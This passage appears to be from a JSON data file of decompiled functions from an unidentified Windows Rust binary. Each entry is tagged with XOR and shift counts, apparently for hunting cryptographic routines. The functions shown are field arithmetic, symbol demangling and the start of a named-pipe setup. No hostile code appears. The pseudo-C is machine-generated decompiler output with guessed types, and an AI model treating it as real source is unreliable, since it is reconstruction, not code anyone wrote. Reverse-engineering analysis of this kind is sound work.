[rsp+58h] [rbp-F8h]\n  unsigned __int64 v35; // [rsp+68h] [rbp-E8h]\n  unsigned __int64 v36; // [rsp+70h] [rbp-E0h]\n  unsigned __int64 v37; // [rsp+80h] [rbp-D0h]\n  unsigned __int64 v38; // [rsp+88h] [rbp-C8h]\n  unsigned __int64 v39; // [rsp+98h] [rbp-B8h]\n  unsigned __int64 v40; // [rsp+A0h] [rbp-B0h]\n  unsigned __int64 v41; // [rsp+B8h] [rbp-98h]\n  unsigned __int64 v42; // [rsp+C0h] [rbp-90h]\n  unsigned __int64 v43; // [rsp+D0h] [rbp-80h]\n  unsigned __int64 v44; // [rsp+E0h] [rbp-70h]\n  unsigned __int64 v45; // [rsp+E8h] [rbp-68h]\n  unsigned __int64 v46; // [rsp+F0h] [rbp-60h]\n  unsigned __int64 v47; // [rsp+108h] [rbp-48h]\n\n  v3 = *a3;\n  v32 = a3[1];\n  v25 = a3[2];\n  v26 = a3[3];\n  v47 = a3[4];\n  v31 = *a2;\n  v4 = a2[4];\n  *((_QWORD *)&v5 + 1) = (*a2 * (unsigned __int128)*a3 + 19 * v32 * (unsigned __int128)v4) >> 64;\n  v23 = a2[3];\n  *(_QWORD *)&v5 = 19 * v25 * v23;\n  v6 = __PAIR128__((19 * v25 * (unsigned __int128)v23) >> 64, *a2 * *a3 + 19 * v32 * v4) + v5;\n  v7 = a2[2];\n  *((_QWORD *)&v5 + 1) = a2[1];\n  v8 = v6 + 19 * v26 * (unsigned __int128)v7 + 19 * v47 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1);\n  v45 = (v3 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v41 = v3 * *((_QWORD *)&v5 + 1);\n  *(_QWORD *)&v5 = (19 * v25 * (unsigned __int128)v4) >> 64;\n  v9 = 19 * v25 * v4;\n  v35 = (19 * v26 * (unsigned __int128)v23) >> 64;\n  v33 = 19 * v26 * v23;\n  v30 = (v3 * (unsigned __int128)v7) >> 64;\n  v44 = v3 * v7;\n  v40 = (v25 * (unsigned __int128)*a2) >> 64;\n  v38 = v25 * *a2;\n  v10 = (19 * v26 * (unsigned __int128)v4) >> 64;\n  v11 = 19 * v26 * v4;\n  v36 = (19 * v47 * (unsigned __int128)v23) >> 64;\n  v34 = 19 * v47 * v23;\n  v29 = (v3 * (unsigned __int128)v23) >> 64;\n  v43 = v3 * v23;\n  v46 = (v25 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v42 = v25 * *((_QWORD *)&v5 + 1);\n  v39 = (v26 * (unsigned __int128)*a2) >> 64;\n  v37 = v26 * *a2;\n  v12 = (19 * v47 * (unsigned __int128)v4) >> 64;\n  v13 = 19 * v47 * v4;\n  v28 = (v3 * (unsigned __int128)v4) >> 64;\n  v14 = v3 * v4;\n  v15 = (v32 * (unsigned __int128)v23) >> 64;\n  v16 = v32 * v23;\n  v24 = v25 * (unsigned __int128)v7;\n  v17 = (v26 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)) >> 64;\n  v27 = v26 * *((_QWORD *)&v5 + 1);\n  v18 = (unsigned __int64)(v8 >> 51)\n      + __PAIR128__(v45, v41)\n      + 19 * v47 * (unsigned __int128)v7\n      + __PAIR128__(v35, v33)\n      + v32 * (unsigned __int128)*a2\n      + __PAIR128__(v5, v9);\n  v19 = (unsigned __int64)(v18 >> 51)\n      + v32 * (unsigned __int128)*((unsigned __int64 *)&v5 + 1)\n      + __PAIR128__(v30, v44)\n      + __PAIR128__(v36, v34)\n      + __PAIR128__(v40, v38)\n      + __PAIR128__(v10, v11);\n  v20 = (unsigned __int64)(v19 >> 51)\n      + __PAIR128__(v46, v42)\n      + v32 * (unsigned __int128)v7\n      + __PAIR128__(v29, v43)\n      + __PAIR128__(v39, v37)\n      + __PAIR128__(v12, v13);\n  v21 = v20 >> 51;\n  result = (v21 + v27 + v24 + v16 + v14 + v47 * *a2) & 0x7FFFFFFFFFFFFi64;\n  *a1 = ((v8 & 0x7FFFFFFFFFFFFi64)\n       + 19\n       * ((__int128)(v21\n                   + __PAIR128__(v17, v27)\n                   + v24\n                   + __PAIR128__(v15, v16)\n                   + __PAIR128__(v28, v14)\n                   + v47 * (unsigned __int128)*a2) >> 51)) & 0x7FFFFFFFFFFFFi64;\n  a1[1] = (v18 & 0x7FFFFFFFFFFFFi64)\n        + ((unsigned __int128)((v8 & 0x7FFFFFFFFFFFFi64)\n                             + 19\n                             * (unsigned __int64)((__int128)(v21\n                                                           + __PAIR128__(v17, v27)\n                                                           + v24\n                                                           + __PAIR128__(v15, v16)\n                                                           + __PAIR128__(v28, v14)\n                                                           + v47 * (unsigned __int128)v31) >> 51)) >> 51);\n  a1[2] = v19 & 0x7FFFFFFFFFFFFi64;\n  a1[3] = v20 & 0x7FFFFFFFFFFFFi64;\n  a1[4] = result;\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_1400206B0",
        "Total XOR and shift operations": 38,
        "XOR operations": 4,
        "Shift operations": 34,
        "Operation percentage": "5.23%",
        "Function Body": "\nchar __fastcall sub_1400206B0(__int64 *a1, __int64 a2, __int64 a3)\n{\n  unsigned __int64 v3; // r14\n  char *v4; // r13\n  __int64 v6; // r10\n  unsigned __int8 *v7; // rax\n  unsigned __int64 v8; // rcx\n  __int64 v9; // r8\n  unsigned __int64 v10; // r15\n  __int64 v11; // r12\n  __int64 v12; // rdi\n  unsigned __int64 v13; // r9\n  unsigned __int64 v14; // rdi\n  unsigned __int64 v15; // rsi\n  unsigned __int64 v16; // rcx\n  unsigned __int64 v17; // rcx\n  unsigned __int64 v18; // rcx\n  __int64 v19; // rcx\n  unsigned __int64 v20; // rax\n  unsigned __int64 v21; // r8\n  char **v22; // rax\n  char *v23; // r8\n  int v24; // ecx\n  int v25; // edx\n  int v26; // esi\n  int v27; // r10d\n  __int64 v28; // r12\n  __int64 v29; // r15\n  unsigned __int64 v30; // rdx\n  __int64 v31; // rax\n  char *v32; // r8\n  unsigned __int8 *v33; // r9\n  bool v34; // sf\n  int v35; // r11d\n  unsigned __int8 *v36; // rcx\n  char v37; // al\n  __int64 v38; // r14\n  unsigned __int64 v39; // r14\n  char *v40; // rcx\n  unsigned __int64 v41; // r8\n  unsigned __int64 v42; // rdx\n  unsigned __int64 v43; // r9\n  int v44; // eax\n  int v45; // edx\n  int v46; // r11d\n  unsigned int v47; // r11d\n  unsigned __int64 v48; // kr00_8\n  bool v49; // cf\n  int v50; // edx\n  __int64 *v51; // r12\n  int v52; // r11d\n  int v53; // ebp\n  int v54; // esi\n  __int64 *v55; // r12\n  int v56; // r11d\n  int v57; // ebp\n  int v58; // esi\n  int v59; // r11d\n  __int64 v60; // rbx\n  unsigned __int8 *v61; // r10\n  __int64 *v62; // rdx\n  int v63; // esi\n  int v64; // ebp\n  int v65; // edi\n  unsigned __int64 v66; // rsi\n  unsigned __int64 v67; // rdi\n  __int64 v69; // [rsp+28h] [rbp-100h]\n  unsigned __int64 v70; // [rsp+28h] [rbp-100h]\n  __int64 v71; // [rsp+30h] [rbp-F8h]\n  char *v72; // [rsp+50h] [rbp-D8h] BYREF\n  unsigned __int64 v73; // [rsp+58h] [rbp-D0h]\n  unsigned __int64 v74; // [rsp+60h] [rbp-C8h]\n  unsigned __int64 v75; // [rsp+68h] [rbp-C0h] BYREF\n  __int64 v76; // [rsp+70h] [rbp-B8h]\n  __int64 v77; // [rsp+78h] [rbp-B0h]\n  __int64 v78; // [rsp+88h] [rbp-A0h]\n  __int64 v79; // [rsp+98h] [rbp-90h]\n  unsigned __int64 v80; // [rsp+A0h] [rbp-88h]\n  __int64 v81; // [rsp+A8h] [rbp-80h]\n  unsigned __int64 v82; // [rsp+B0h] [rbp-78h]\n  char *v83; // [rsp+B8h] [rbp-70h]\n  __int64 v84; // [rsp+C0h] [rbp-68h]\n  unsigned __int64 v85; // [rsp+C8h] [rbp-60h]\n  __int64 v86[11]; // [rsp+D0h] [rbp-58h] BYREF\n\n  v3 = a3;\n  v4 = (char *)a2;\n  sub_140005D10(&v72, a2, a3, byte_140068A98, 6ui64);\n  if ( v72 )\n  {\n    v6 = v77;\n    LOBYTE(v7) = v82;\n    v8 = v82 + v77 - 1;\n    if ( v8 >= v80 )\n      goto LABEL_66;\n    v9 = v78;\n    v10 = v82 - 1;\n    v11 = v76;\n    v85 = v75;\n    v84 = v82 - v75;\n    v12 = v78;\n    v69 = v78;\n    v83 = v4;\n    while ( 1 )\n    {\n      if ( v9 == -1 )\n      {\n        v13 = v6;\n        while ( !_bittest64(&v11, *(unsigned __int8 *)(v79 + v8)) )\n        {\n          v8 = v13 + 2 * v82 - 1;\n          v13 += v82;\n          if ( v10 + v13 >= v80 )\n          {\n            v77 = v6;\n            v78 = v12;\n            goto LABEL_66;\n          }\n        }\n        v71 = v12;\n        v15 = 0i64;\n        v14 = v69;\n      }\n      else if ( _bittest64(&v11, *(unsigned __int8 *)(v79 + v8)) )\n      {\n        v71 = v12;\n        v13 = v6;\n        v14 = v69;\n        v15 = v69;\n      }\n      else\n      {\n        v6 += v82;\n        v16 = v10 + v6;\n        v13 = v6;\n        if ( v10 + v6 >= v80 )\n          goto LABEL_184;\n        while ( !_bittest64(&v11, *(unsigned __int8 *)(v79 + v16)) )\n        {\n          v13 += v82;\n          v16 += v82;\n          if ( v16 >= v80 )\n          {\n            v78 = 0i64;\n            v77 = v13;\n            goto LABEL_66;\n          }\n        }\n        v71 = 0i64;\n        v15 = 0i64;\n        v14 = 0i64;\n      }\n      v69 = v14;\n      if ( v73 > v14 )\n        v14 = v73;\n      if ( v78 == -1 )\n        v14 = v73;\n      if ( v14 >= v82 )\n      {\nLABEL_26:\n        v18 = v73;\n        v4 = v83;\n        do\n        {\n          if ( v15 >= v18 )\n            goto LABEL_42;\n          if ( --v18 >= v82 )\n            sub_14005DDC0(v18, v82, (__int64)&off_140069DC0);\n          if ( v18 + v13 >= v80 )\n            sub_14005DDC0(v18 + v13, v80, (__int64)&off_140069DD8);\n        }\n        while ( *(_BYTE *)(v81 + v18) == *(_BYTE *)(v79 + v18 + v13) );\n        v19 = v84;\n        v6 = v85 + v13;\n        v9 = v78;\n        v12 = v71;\n        if ( v78 == -1 )\n          goto LABEL_36;\n      }\n      else\n      {\n        v17 = v14;\n        while ( 1 )\n        {\n          if ( v13 + v17 >= v80 )\n          {\n            v67 = v13 + v14;\n            if ( v80 > v67 )\n              v67 = v80;\n            sub_14005DDC0(v67, v80, (__int64)&off_140069DF0);\n          }\n          if ( *(_BYTE *)(v81 + v17) != *(_BYTE *)(v79 + v13 + v17) )\n            break;\n          if ( v82 == ++v17 )\n            goto LABEL_26;\n        }\n        v6 = v13 + v17 - v73 + 1;\n        v9 = v78;\n        v4 = v83;\n        if ( v78 == -1 )\n        {\n          v12 = v71;\n          goto LABEL_36;\n        }\n        v19 = 0i64;\n      }\n      v12 = v19;\n      v69 = v19;\nLABEL_36:\n      v8 = v10 + v6;\n      if ( v10 + v6 >= v80 )\n      {\nLABEL_184:\n        v77 = v6;\n        goto LABEL_66;\n      }\n    }\n  }\n  do\n  {\n    sub_14001F090(v86, (__int64)&v72);\n    LOBYTE(v7) = v86[0];\n  }\n  while ( v86[0] == 1 );\n  if ( v86[0] )\n  {\nLABEL_66:\n    if ( v3 < 3 )\n    {\n      v28 = 2i64;\n      if ( v3 != 2 )\n        goto LABEL_180;\n      LODWORD(v7) = *(unsigned __int16 *)v4;\n      if ( (_DWORD)v7 != 20058 )\n        goto LABEL_97;\n      v70 = 2i64;\n      v29 = 0i64;\n      v21 = 2i64;\nLABEL_82:\n      v32 = &v4[v21];\n      v33 = (unsigned __int8 *)&v32[v29];\n      v7 = 0i64;\n      while ( (unsigned __int8 *)v29 != v7 )\n      {\n        v34 = ((v7++)[(_QWORD)v32] & 0x80u) != 0;\n        if ( v34 )\n          goto LABEL_90;\n      }\n      if ( !v29 )\n        goto LABEL_90;\n      v35 = (unsigned __int8)*v32;\n      if ( *v32 >= 0 )\n      {\n        v36 = (unsigned __int8 *)(v32 + 1);\n        if ( v35 != 69 )\n          goto LABEL_89;\nLABEL_155:\n        v39 = 0i64;\nLABEL_156:\n        v43 = v33 - v36;\n        if ( v43 )\n        {\nLABEL_162:\n          v28 = 2i64;\n          if ( *v36 != 46 )\n            goto LABEL_180;\n          v7 = &v36[v43];\n          LOBYTE(v59) = 46;\n          v60 = 0x7E0000007Fi64;\n          v61 = v36;\nLABEL_171:\n          ++v61;\n          v59 = (unsigned __int8)v59;\n          while ( 1 )\n          {\n            if ( (unsigned int)(v59 - 33) >= 0x19 && (v59 & 0xFFFFFFDF) - 65 >= 0x1A )\n            {\n              v66 = (unsigned int)(v59 - 58);\n              if ( ((unsigned int)v66 > 0x26 || !_bittest64(&v60, v66)) && (unsigned int)(v59 - 127) < 0xFFFFFFFC )\n                goto LABEL_180;\n            }\n            if ( v61 == v7 )\n              goto LABEL_158;\n            LOBYTE(v59) = *v61;\n            if ( (*v61 & 0x80u) == 0 )\n              goto LABEL_171;\n            v62 = a1;\n            v63 = v59 & 0x1F;\n            v64 = v61[1] & 0x3F;\n            if ( (unsigned __int8)v59 <= 0xDFu )\n              break;\n            v65 = (v64 << 6) | v61[2] & 0x3F;\n            if ( (unsigned __int8)v59 < 0xF0u )\n            {\n              v61 += 3;\n              v59 = (v63 << 12) | v65;\nLABEL_170:\n              a1 = v62;\n            }\n            else\n            {\n              v59 = ((v59 & 7) << 18) | (v65 << 6) | v61[3] & 0x3F;\n              a1 = v62;\n              if ( v59 == 1114112 )\n                goto LABEL_158;\n              v61 += 4;\n            }\n          }\n          v61 += 2;\n          v59 = v64 | (v63 << 6);\n          goto LABEL_170;\n        }\nLABEL_157:\n        v43 = 0i64;\nLABEL_158:\n        a1[1] = (__int64)v32;\n        a1[2] = v29;\n        a1[3] = v39;\n        a1[4] = (__int64)v4;\n        LOBYTE(v7) = v70;\n        a1[5] = v70;\n        a1[6] = (__int64)v36;\n        a1[7] = v43;\n        v28 = 1i64;\n        goto LABEL_180;\n      }\n      v44 = v35 & 0x1F;\n      v45 = v32[1] & 0x3F;\n      if ( (unsigned __int8)v35 <= 0xDFu )\n      {\n        v36 = (unsigned __int8 *)(v32 + 2);\n        LODWORD(v7) = v45 | (v44 << 6);\n        v35 = (int)v7;\n        if ( (_DWORD)v7 == 69 )\n          goto LABEL_155;\n      }\n      else\n      {\n        v46 = (v45 << 6) | v32[2] & 0x3F;\n        if ( (unsigned __int8)*v32 < 0xF0u )\n        {\n          v36 = (unsigned __int8 *)(v32 + 3);\n          LODWORD(v7) = v44 << 12;\n          v35 = (unsigned int)v7 | v46;\n          if ( v35 == 69 )\n            goto LABEL_155;\n        }\n        else\n        {\n          v36 = (unsigned __int8 *)(v32 + 4);\n          LODWORD(v7) = (v44 & 7) << 18;\n          v35 = (unsigned int)v7 | (v46 << 6) | v32[3] & 0x3F;\n          if ( v35 == 69 )\n            goto LABEL_155;\n        }\n      }\nLABEL_89:\n      if ( v35 == 1114112 )\n        goto LABEL_90;\n      v39 = 0i64;\n      while ( 1 )\n      {\n        v47 = v35 - 48;\n        if ( v47 > 9 )\n          break;\n        v7 = 0i64;\n        do\n        {\n          v48 = (unsigned __int64)v7;\n          v7 = (unsigned __int8 *)(10i64 * (_QWORD)v7);\n          if ( !is_mul_ok(0xAui64, v48) )\n            goto LABEL_90;\n          v49 = __CFADD__(v47, v7);\n          v7 += v47;\n          if ( v49 || v36 == v33 )\n            goto LABEL_90;\n          v50 = *v36;\n          if ( (*v36 & 0x80u) == 0 )\n          {\n            ++v36;\n          }\n          else\n          {\n            v51 = a1;\n            v52 = v50 & 0x1F;\n            v53 = v36[1] & 0x3F;\n            if ( (unsigned __int8)v50 <= 0xDFu )\n            {\n              v36 += 2;\n              v50 = v53 | (v52 << 6);\n              a1 = v51;\n            }\n            else\n            {\n              v54 = (v53 << 6) | v36[2] & 0x3F;\n              if ( *v36 < 0xF0u )\n              {\n                v36 += 3;\n                v50 = (v52 << 12) | v54;\n                a1 = v51;\n              }\n              else\n              {\n                v50 = ((v50 & 7) << 18) | (v54 << 6) | v36[3] & 0x3F;\n                a1 = v51;\n                if ( v50 == 1114112 )\n                  goto LABEL_90;\n                v36 += 4;\n              }\n            }\n          }\n          v47 = v50 - 48;\n        }\n        while ( (unsigned int)(v50 - 48) < 0xA );\n        for ( ; v7; --v7 )\n        {\n          if ( v36 == v33 )\n            goto LABEL_90;\n          v50 = *v36;\n          if ( (*v36 & 0x80u) == 0 )\n          {\n            ++v36;\n          }\n          else\n          {\n            v55 = a1;\n            v56 = v50 & 0x1F;\n            v57 = v36[1] & 0x3F;\n            if ( (unsigned __int8)v50 <= 0xDFu )\n            {\n              v36 += 2;\n              v50 = v57 | (v56 << 6);\nLABEL_150:\n              a1 = v55;\n              continue;\n            }\n            v58 = (v57 << 6) | v36[2] & 0x3F;\n            if ( *v36 < 0xF0u )\n            {\n              v36 += 3;\n              v50 = (v56 << 12) | v58;\n              goto LABEL_150;\n            }\n            v50 = ((v50 & 7) << 18) | (v58 << 6) | v36[3] & 0x3F;\n            a1 = v55;\n            if ( v50 == 1114112 )\n              goto LABEL_90;\n            v36 += 4;\n          }\n        }\n        ++v39;\n        v35 = v50;\n        if ( v50 == 69 )\n          goto LABEL_156;\n      }\nLABEL_90:\n      v30 = v70;\n      if ( v70 >= 3 )\n        goto LABEL_91;\nLABEL_97:\n      v30 = 2i64;\n      v28 = 2i64;\n      if ( *v4 != 82 )\n        goto LABEL_180;\n      goto LABEL_98;\n    }\n    if ( *(_WORD *)v4 ^ 0x5A5F | (unsigned __int8)v4[2] ^ 0x4E )\n    {\n      if ( *(_WORD *)v4 == 20058 )\n      {\n        if ( v4[2] <= -65 )\n          sub_14005E370(v4, v3, 2ui64, v3, (__int64)&off_1400684E0);\n        v29 = v3 - 2;\n        v21 = 2i64;\n        v70 = v3;\n        goto LABEL_82;\n      }\n      v30 = 3i64;\n      if ( v3 < 4 )\n      {\nLABEL_91:\n        LODWORD(v7) = *(unsigned __int16 *)v4;\n        if ( (_DWORD)v7 == 21087 )\n        {\n          v37 = v4[2];\n          if ( v37 <= -65 )\n            sub_14005E370(v4, v30, 2ui64, v30, (__int64)&off_140068748);\n          v29 = (__int64)(v4 + 2);\n          v38 = -2i64;\n          goto LABEL_102;\n        }\n        if ( *v4 != 82 )\n        {\n          v28 = 2i64;\n          if ( v30 <= 3 )\n            goto LABEL_180;\n          LOWORD(v7) = *(_WORD *)v4 ^ 0x5F5F;\n          if ( (unsigned __int16)v7 | (unsigned __int8)v4[2] ^ 0x52 )\n            goto LABEL_180;\n          v37 = v4[3];\n          if ( v37 <= -65 )\n            sub_14005E370(v4, v30, 3ui64, v30, (__int64)&off_140068718);\n          v29 = (__int64)(v4 + 3);\n          v38 = -3i64;\nLABEL_102:\n          LOBYTE(v7) = v37 - 65;\n          v28 = 2i64;\n          if ( (unsigned __int8)v7 > 0x19u )\n            goto LABEL_180;\n          v39 = v30 + v38;\n          v7 = 0i64;\n          while ( (unsigned __int8 *)v39 != v7 )\n          {\n            v34 = ((v7++)[v29] & 0x80u) != 0;\n            if ( v34 )\n              goto LABEL_180;\n          }\n          v70 = v30;\n          v72 = (char *)v29;\n          v73 = v39;\n          v74 = 0i64;\n          LODWORD(v75) = 0;\n          v76 = 0i64;\n          LODWORD(v77) = 0;\n          LOBYTE(v7) = sub_14001B970((__int64)&v72, 0);\n          if ( !(_BYTE)v7 )\n          {\n            v40 = v72;\n            if ( !v72 )\n              goto LABEL_180;\n            LOBYTE(v7) = v73;\n            v41 = v74;\n            v42 = (unsigned __int8)v73 | ((((unsigned __int64)((HIBYTE(v73) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v73 + 5)) << 32) | *(unsigned int *)((char *)&v73 + 1)) << 8);\n            if ( v74 >= v42 || (LOBYTE(v7) = v72[v74] - 65, (unsigned __int8)v7 >= 0x1Au) )\n            {\nLABEL_114:\n              if ( v41 )\n              {\n                v43 = v42 - v41;\n                if ( v42 <= v41 )\n                {\n                  if ( v42 != v41 )\n                    goto LABEL_197;\n                }\n                else if ( v40[v41] <= -65 )\n                {\nLABEL_197:\n                  sub_14005E370(v40, v42, v41, v42, (__int64)&off_140068760);\n                }\n              }\n              else\n              {\n                v43 = v42;\n              }\n              v36 = (unsigned __int8 *)&v40[v41];\n              v32 = 0i64;\n              if ( v43 )\n                goto LABEL_162;\n              goto LABEL_157;\n            }\n            v73 = (unsigned __int8)v73 | ((((unsigned __int64)((HIBYTE(v73) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v73 + 5)) << 32) | *(unsigned int *)((char *)&v73 + 1)) << 8);\n            _mm_storel_ps((double *)&v75, (__m128)v75);\n            v76 = 0i64;\n            LODWORD(v77) = 0;\n            LOBYTE(v7) = sub_14001B970((__int64)&v72, 0);\n            if ( !(_BYTE)v7 )\n            {\n              v40 = v72;\n              if ( !v72 )\n                goto LABEL_180;\n              LOBYTE(v7) = v73;\n              v41 = v74;\n              v42 = (unsigned __int8)v73 | ((((unsigned __int64)((HIBYTE(v73) << 16) | (unsigned int)*(unsigned __int16 *)((char *)&v73 + 5)) << 32) | *(unsigned int *)((char *)&v73 + 1)) << 8);\n              goto LABEL_114;\n            }\n          }\n          sub_14005E190(\n            (__int64)\"`fmt::Error`s should be impossible without a `fmt::Formatter`\",\n            61i64,\n            (__int64)v86,\n            (__int64)&off_1400683A8,\n            (__int64)&off_1400687B8);\n        }\nLABEL_98:\n        v37 = v4[1];\n        if ( v37 <= -65 )\n          sub_14005E370(v4, v30, 1ui64, v30, (__int64)&off_140068730);\n        v29 = (__int64)(v4 + 1);\n        v38 = -1i64;\n        goto LABEL_102;\n      }\n      if ( *(_DWORD *)v4 != 1314545503 )\n      {\n        v30 = v3;\n        goto LABEL_91;\n      }\n      v21 = 4i64;\n      if ( v3 >= 5 )\n      {\n        if ( v4[4] > -65 )\n        {\n          v29 = v3 - 4;\n          v70 = v3;\n          goto LABEL_82;\n        }\n        v22 = &off_1400684C8;\n        goto LABEL_196;\n      }\n      v29 = 0i64;\n      v31 = 4i64;\n    }\n    else\n    {\n      v21 = 3i64;\n      if ( v3 >= 4 )\n      {\n        if ( v4[3] > -65 )\n        {\n          v29 = v3 - 3;\n          v70 = v3;\n          goto LABEL_82;\n        }\n        v22 = &off_1400684F8;\nLABEL_196:\n        sub_14005E370(v4, v3, v21, v3, (__int64)v22);\n      }\n      v29 = 0i64;\n      v31 = 3i64;\n    }\n    v70 = v31;\n    goto LABEL_82;\n  }\n  v13 = v86[1];\nLABEL_42:\n  v20 = v3;\n  v21 = v13 + 6;\n  if ( v13 != -6i64 )\n  {\n    v20 = v3 - v21;\n    if ( v3 <= v21 )\n    {\n      if ( v3 != v21 )\n        goto LABEL_45;\n    }\n    else if ( v4[v21] <= -65 )\n    {\nLABEL_45:\n      v22 = (char **)&off_140068B08;\n      goto LABEL_196;\n    }\n  }\n  v23 = &v4[v21];\n  v7 = (unsigned __int8 *)&v23[v20];\n  while ( v23 != (char *)v7 )\n  {\n    v24 = (unsigned __int8)*v23;\n    if ( *v23 < 0 )\n    {\n      v25 = v24 & 0x1F;\n      v26 = v23[1] & 0x3F;\n      if ( (unsigned __int8)v24 <= 0xDFu )\n      {\n        v23 += 2;\n        v24 = v26 | (v25 << 6);\n      }\n      else\n      {\n        v27 = (v26 << 6) | v23[2] & 0x3F;\n        if ( (unsigned __int8)*v23 < 0xF0u )\n        {\n          v23 += 3;\n          v24 = (v25 << 12) | v27;\n        }\n        else\n        {\n          v24 = ((v24 & 7) << 18) | (v27 << 6) | v23[3] & 0x3F;\n          if ( v24 == 1114112 )\n            break;\n          v23 += 4;\n        }\n      }\n    }\n    else\n    {\n      ++v23;\n    }\n    if ( (unsigned int)(v24 - 64) >= 7 && (unsigned int)(v24 - 48) >= 0xA )\n      goto LABEL_66;\n  }\n  if ( v13 )\n  {\n    if ( v13 >= v3 )\n    {\n      if ( v13 == v3 )\n        goto LABEL_66;\n    }\n    else if ( v4[v13] > -65 )\n    {\n      v3 = v13;\n      goto LABEL_66;\n    }\n    sub_14005E370(v4, v3, 0i64, v13, (__int64)&off_140068B20);\n  }\n  v28 = 2i64;\nLABEL_180:\n  *a1 = v28;\n  return (char)v7;\n}\n// 1400683A8: using guessed type __int64 (__fastcall *off_1400683A8)();\n// 1400684C8: using guessed type char *off_1400684C8;\n// 1400684E0: using guessed type char *off_1400684E0;\n// 1400684F8: using guessed type char *off_1400684F8;\n// 140068718: using guessed type char *off_140068718;\n// 140068730: using guessed type char *off_140068730;\n// 140068748: using guessed type char *off_140068748;\n// 140068760: using guessed type char *off_140068760;\n// 1400687B8: using guessed type char *off_1400687B8;\n// 140068A98: using guessed type _BYTE byte_140068A98[6];\n// 140068B08: using guessed type void *off_140068B08;\n// 140068B20: using guessed type void *off_140068B20;\n// 140069DC0: using guessed type void *off_140069DC0;\n// 140069DD8: using guessed type void *off_140069DD8;\n// 140069DF0: using guessed type void *off_140069DF0;\n\n"
    },
    {
        "Function": "sub_140042940",
        "Total XOR and shift operations": 17,
        "XOR operations": 1,
        "Shift operations": 16,
        "Operation percentage": "4.29%",
        "Function Body": "\nint __fastcall sub_140042940(__int64 a1, unsigned __int8 a2)\n{\n  char v2; // di\n  DWORD v3; // r15d\n  char v4; // si\n  NTSTATUS (__stdcall *v5)(BCRYPT_ALG_HANDLE, PUCHAR, ULONG, ULONG); // rbx\n  __int64 v6; // rax\n  char *v7; // r12\n  unsigned int v8; // ebx\n  char *v9; // r14\n  __int16 v10; // di\n  __int16 v11; // r13\n  unsigned __int64 v12; // r15\n  int v13; // eax\n  int v14; // edx\n  int v15; // ebx\n  __int64 v16; // rax\n  unsigned __int64 v17; // r15\n  unsigned __int64 v18; // r15\n  WCHAR *v19; // rax\n  LPCWSTR v20; // rcx\n  __int64 v21; // rsi\n  __int16 v22; // ax\n  unsigned int v23; // ebx\n  unsigned __int64 v24; // r15\n  __int64 v25; // r15\n  __int64 v26; // r15\n  bool v27; // cf\n  __int64 v28; // rdx\n  __int64 v29; // rax\n  int v30; // eax\n  int v31; // r8d\n  int v32; // ebx\n  char v33; // dl\n  HANDLE NamedPipeW; // rsi\n  __int64 v35; // rax\n  __int64 v36; // rcx\n  _QWORD *v37; // rax\n  __int64 v38; // rdi\n  void *v39; // rdi\n  __int64 v40; // rdx\n  __int128 v42; // [rsp+40h] [rbp-40h] BYREF\n  __int64 v43; // [rsp+50h] [rbp-30h]\n  HANDLE v44; // [rsp+58h] [rbp-28h]\n  __int64 v45; // [rsp+60h] [rbp-20h] BYREF\n  __int64 v46; // [rsp+68h] [rbp-18h]\n  DWORD *p_CurrentProcessId; // [rsp+70h] [rbp-10h] BYREF\n  __int64 (__fastcall *v48)(unsigned int *, __int64); // [rsp+78h] [rbp-8h]\n  __int64 *v49; // [rsp+80h] [rbp+0h]\n  __int64 (__fastcall *v50)(unsigned __int64 *, __int64); // [rsp+88h] [rbp+8h]\n  __int128 v51; // [rsp+90h] [rbp+10h]\n  __int64 v52; // [rsp+A0h] [rbp+20h]\n  DWORD CurrentProcessId; // [rsp+A8h] [rbp+28h] BYREF\n  DWORD dwPipeMode; // [rsp+ACh] [rbp+2Ch]\n  unsigned int v55; // [rsp+B0h] [rbp+30h]\n  DWORD dwOpenMode; // [rsp+B4h] [rbp+34h]\n  _QWORD *v57; // [rsp+B8h] [rbp+38h]\n  UCHAR pbBuffer[16]; // [rsp+C0h] [rbp+40h] BYREF\n  __int128 v59; // [rsp+D0h] [rbp+50h]\n  __int64 v60; // [rsp+E0h] [rbp+60h]\n  LPCWSTR lpName; // [rsp+F0h] [rbp+70h]\n  unsigned __int64 v62; // [rsp+F8h] [rbp+78h]\n  unsigned __int8 v63; // [rsp+105h] [rbp+85h]\n  char v64; // [rsp+106h] [rbp+86h]\n  char v65; // [rsp+107h] [rbp+87h]\n  __int64 v66; // [rsp+108h] [rbp+88h]\n\n  v66 = -2i64;\n  v57 = (_QWORD *)a1;\n  v63 = a2;\n  dwOpenMode = 1074266114 - a2;\n  v2 = 0;\n  v3 = 8;\n  v4 = 1;\n  v5 = BCryptGenRandom;\n  v46 = 0i64;\n  while ( 2 )\n  {\n    CurrentProcessId = GetCurrentProcessId();\n    while ( !qword_140087C30 )\n    {\n      *(_OWORD *)pbBuffer = 0i64;\n      if ( v5(0i64, pbBuffer, 0x10u, 2u) >= 0 )\n      {\n        v6 = *(_QWORD *)pbBuffer;\n      }\n      else\n      {\n        v65 = v2;\n        v64 = 1;\n        v6 = sub_140043FA0();\n      }\n      _InterlockedExchange64(&qword_140087C30, v6);\n    }\n    v45 = _InterlockedExchangeAdd64(&qword_140087C30, 1ui64);\n    p_CurrentProcessId = &CurrentProcessId;\n    v48 = sub_140003EC0;\n    v49 = &v45;\n    v50 = sub_1400027F0;\n    *(_QWORD *)pbBuffer = &off_14006C678;\n    *(_QWORD *)&pbBuffer[8] = 2i64;\n    v60 = 0i64;\n    *(_QWORD *)&v59 = &p_CurrentProcessId;\n    *((_QWORD *)&v59 + 1) = 2i64;\n    v65 = v2;\n    v64 = 1;\n    sub_140001EF0((__int64)&v42, (__int64 *)pbBuffer);\n    *(_OWORD *)pbBuffer = v42;\n    *(_QWORD *)&v59 = v43;\n    if ( !((*((_QWORD *)&v51 + 1) == 0i64) | v4 & 1) )\n      sub_1400015D0((void *)v51, 1ui64);\n    v52 = v59;\n    v51 = *(_OWORD *)pbBuffer;\n    v7 = (char *)(*(_QWORD *)pbBuffer + v59);\n    dwPipeMode = v3;\n    if ( (_QWORD)v59 )\n    {\n      LOWORD(v8) = (unsigned __int8)**(_BYTE **)pbBuffer;\n      if ( (char)**(_BYTE **)pbBuffer >= 0 